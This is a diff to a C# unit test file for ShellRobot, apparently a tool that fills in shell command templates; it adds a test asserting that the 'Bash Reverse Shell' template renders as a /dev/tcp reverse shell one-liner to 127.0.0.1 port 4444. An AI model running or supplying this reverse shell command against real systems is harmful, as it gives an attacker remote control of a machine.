@@ -1,7 +1,6 @@
 using System;
 
 using System.IO;
-
 using System.Threading.Tasks;
 
 using Microsoft.VisualStudio.TestTools.UnitTesting;
@@ -44,6 +43,30 @@ namespace ShellRobot.Shared.Testing
             Directory.Delete(workingDirectory, true);
             
             Assert.IsTrue(templates.Count >= 1);
+        }
+        
+        [TestMethod]
+        public async Task TestGenerateGenericBashRevShell()
+        {
+            // Setup random working directory for ShellRobot instance
+            var workingDirectory = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
+            Environment.SetEnvironmentVariable("SHELLROBOT_HOME", workingDirectory);
+            
+            var instance = new ShellRobot();
+            await instance.UpdateAsync();
+
+            var revShell = await instance.ParseTemplateAsync("Bash Reverse Shell", new[]
+            {
+                "address",
+                "127.0.0.1",
+                "port",
+                "4444"
+            });
+            
+            // Recursively delete any file and directory inside workingDirectory
+            Directory.Delete(workingDirectory, true);
+            
+            Assert.IsTrue(revShell == "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1");
         }
     }
 }
